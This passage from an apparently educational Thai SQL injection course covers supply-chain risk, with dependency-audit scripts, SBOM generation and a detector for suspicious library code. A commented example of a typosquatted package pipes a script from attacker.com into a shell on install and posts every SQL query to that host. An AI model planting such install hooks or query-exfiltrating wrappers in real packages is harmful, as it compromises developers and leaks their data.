# Part 060: Supply Chain และ SQL Injection

## ภาพรวม

Supply chain attacks ผ่านไลบรารีและ dependencies ที่มีช่องโหว่ SQL injection

**ขั้นตอนที่ 971-985**

---

## 971. Third-Party Library Vulnerabilities

```python
# ตรวจสอบไลบรารี dependencies หา SQLi vulnerabilities

import subprocess
import json

def audit_python_deps():
    """Audit Python packages for known SQLi vulnerabilities"""
    # ใช้ safety check
    result = subprocess.run(
        ['safety', 'check', '--json'],
        capture_output=True, text=True
    )
    
    if result.returncode == 0:
        print("[+] No known vulnerabilities")
        return []
    
    try:
        vulns = json.loads(result.stdout)
        sql_related = []
        
        for vuln in vulns.get('vulnerabilities', []):
            if any(kw in str(vuln).lower() for kw in 
                   ['sql', 'injection', 'query', 'database']):
                sql_related.append(vuln)
                print(f"[!] SQL-related: {vuln.get('package_name')} - {vuln.get('advisory')}")
        
        return sql_related
    except Exception:
        return []

def check_npm_audit():
    """Run npm audit for SQL injection vulnerabilities"""
    result = subprocess.run(
        ['npm', 'audit', '--json'],
        capture_output=True, text=True
    )
    
    try:
        audit = json.loads(result.stdout)
        vulns = audit.get('vulnerabilities', {})
        
        sql_vulns = {}
        for pkg, details in vulns.items():
            title = str(details).lower()
            if 'sql' in title or 'injection' in title:
                sql_vulns[pkg] = details
                print(f"[!] {pkg}: SQL vulnerability found")
        
        return sql_vulns
    except Exception:
        return {}
```

---

## 972. Typosquatting + SQL Injection

```python
# Package typosquatting: เอา package ชื่อใกล้เคียงกับของจริง
# เช่น 'python-mysql' แทน 'PyMySQL'

# ตัวอย่าง malicious package:
# setup.py ของ fake package:
# from setuptools import setup
# import subprocess
# subprocess.run('curl http://attacker.com/steal.sh | sh', shell=True)

# package code:
# import database
# 
# class MySQLConnection:
#     def query(self, sql, params=None):
#         # ส่ง SQL queries ไปยัง attacker
#         import requests
#         requests.post('http://attacker.com/log', json={'query': sql, 'params': str(params)})
#         # แล้วใช้งานปกติ

# ป้องกัน:
# 1. ตรวจสอบชื่อ package อย่างระมัดระวัง
# 2. กำหนด version ranges ใน requirements.txt
# 3. ใช้ pip-audit หรือ safety
# 4. private PyPI server สำหรับองค์กร

# Check for suspicious packages:
import importlib
import inspect

def audit_db_library(module_name: str):
    try:
        mod = importlib.import_module(module_name)
        source = inspect.getsource(mod)
        
        suspicious = [
            'requests.post', 'urllib.request', 'socket.connect',
            'subprocess.run', 'os.system', 'eval(', 'exec('
        ]
        
        for pattern in suspicious:
            if pattern in source:
                print(f"[!] Suspicious: {module_name} contains {pattern!r}")
    except Exception as e:
        print(f"Error: {e}")
```

---

## 973. Software Bill of Materials (SBOM)

```bash
# สร้าง SBOM เพื่อตรวจสอบ dependencies

# Python:
pip install cyclonedx-bom
cyclonedx-py -p requirements.txt -o sbom.json

# Node.js:
npx @cyclonedx/bom -o sbom.json

# ตรวจสอบ SBOM หา SQL-related packages:
python3 << 'EOF'
import json

with open('sbom.json') as f:
    sbom = json.load(f)

db_components = []
for comp in sbom.get('components', []):
    name = comp.get('name', '').lower()
    if any(kw in name for kw in ['sql', 'db', 'database', 'mysql', 'postgres', 'sqlite']):
        db_components.append(comp['name'])

print("DB-related components:")
for c in db_components:
    print(f"  - {c}")
EOF
```

---

## สรุป

Supply Chain + SQL Injection:
- **Third-party libs** - ตรวจ dependencies ด้วย safety/audit
- **Typosquatting** - package ชื่อใกล้เคียง = malicious
- **SBOM** - CycloneDX ตามมาตรฐาน
- **Prevention** - pin versions, private registry, code review

---

*Part 060 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
